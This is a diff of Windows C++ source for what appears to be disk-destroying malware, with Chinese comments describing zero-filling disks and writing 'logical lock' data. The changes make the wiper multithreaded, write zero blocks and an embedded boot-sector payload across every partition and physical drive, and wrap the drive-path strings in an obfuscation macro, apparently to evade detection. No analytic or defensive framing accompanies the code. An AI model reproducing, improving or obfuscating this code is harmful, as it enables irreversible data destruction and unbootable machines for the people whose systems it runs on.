@@ -1,25 +1,36 @@
 #include"DiskOperation.h"
-void WriteDiskThread(LPCWSTR disk) {
-	HANDLE drv = CreateFileW(disk, GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, OPEN_EXISTING, 0, 0);
-	unsigned char* data = (unsigned char*)LocalAlloc(LMEM_ZEROINIT, 512);
-	DWORD dwJunk;
-	SetFilePointer(drv, 0, NULL, FILE_BEGIN);
-	for (ULONGLONG i = 1; i <= 1000000; i++) {
-		WriteFile(drv, data, 512, &dwJunk, NULL);
-		SetFilePointer(drv, 512, NULL, FILE_CURRENT);
-	}
-	CloseHandle(drv);
-}//线程涂0磁盘
+#include"ENstr.h"
+#define BLOCK_SIZE (1024 * 1024 * 1)  // 1MB
+#define NUM_THREADS 4
+void WriteDiskThread(PVOID params) {
+    HANDLE drv = reinterpret_cast<HANDLE>(params);
+    unsigned char* data = new unsigned char[BLOCK_SIZE]();
+    DWORD dwJunk;
+    LARGE_INTEGER offset;
+    offset.QuadPart = 0;
 
+    for (ULONGLONG i = 0; i <= 500; i++) {
+        WriteFile(drv, data, BLOCK_SIZE, &dwJunk, NULL);
+        offset.QuadPart += BLOCK_SIZE;
+        SetFilePointerEx(drv, offset, NULL, FILE_BEGIN);
+    }
+    delete[] data;
+}
 void WriteDisk(LPCWSTR disk) {
-	HANDLE hThread = CreateThread(NULL, 0, LPTHREAD_START_ROUTINE(WriteDiskThread), (PVOID)disk, 0, NULL);
-	DWORD dwThreadStatus = WaitForSingleObject(hThread, 5);
-	if (dwThreadStatus == WAIT_TIMEOUT) {
-		TerminateThread(hThread, 0);
-		CloseHandle(hThread);
-		hThread = NULL;
-	}
-}//创建线程涂磁盘
+    HANDLE drv = CreateFileW(disk, GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, OPEN_EXISTING, 0, 0);
+
+    HANDLE hThreads[NUM_THREADS];
+    for (int i = 0; i < NUM_THREADS; i++) {
+        hThreads[i] = CreateThread(NULL, 0, LPTHREAD_START_ROUTINE(WriteDiskThread), drv, 0, NULL);
+    }
+
+    WaitForMultipleObjects(NUM_THREADS, hThreads, TRUE, INFINITE);
+
+    for (int i = 0; i < NUM_THREADS; i++) {
+        CloseHandle(hThreads[i]);
+    }
+    CloseHandle(drv);
+}
 unsigned char data_a[512] = {
 	0xEA, 0x05, 0x7C, 0x00, 0x00, 0xFA, 0x31, 0xC0, 0x8E, 0xD0, 0xBC, 0xF0, 0x7B, 0xFB, 0xBB, 0x00,
 	0x10, 0x8E, 0xC3, 0xB8, 0x08, 0x02, 0xB9, 0x02, 0x00, 0xB6, 0x00, 0x31, 0xDB, 0xCD, 0x13, 0x06,
@@ -108,8 +119,7 @@ BOOL WriteLock(HANDLE drive) {//写入逻辑锁数据
 		data_main[i + 1] = data_b[i - 524287];
 	}
 	DWORD wb;
-	//WriteFile(drive, data_main, 1024000, &wb, NULL);
-	return SCSISectorIO(drive, 0, data_main, 1024000, SCSI_W);
+	return WriteFile(drive, data_main, 1024000, &wb, NULL);
 	CloseHandle(drive);
 }
 LPCWSTR CharToLPCWSTR(const char* charString) {
@@ -123,13 +133,13 @@ void LogicalLock()
 	char diskPath[256];
 	for (int i = 0; i <GetPhysicalDriveNumber(); i++) {
 		for (int j = 0; j <= 3; j++) {
-			sprintf_s(diskPath, 50, "\\\\.\\Harddisk%dPartition%d", i, j);
+			sprintf_s(diskPath, 50, _c("\\\\.\\Harddisk%dPartition%d"), i, j);
 			WriteDisk(CharToLPCWSTR(diskPath));
 			//std::cout << diskPath << std::endl;
 		}
 	}
 	for (int i = 0; i <GetPhysicalDriveNumber(); i++) {
-		sprintf_s(diskPath, 50, "\\\\.\\PhysicalDrive%d", i);
+		sprintf_s(diskPath, 50,_c("\\\\.\\PhysicalDrive%d"), i);
 	//	std::cout << diskPath << std::endl;
 		WriteDisk(CharToLPCWSTR(diskPath));
 	}
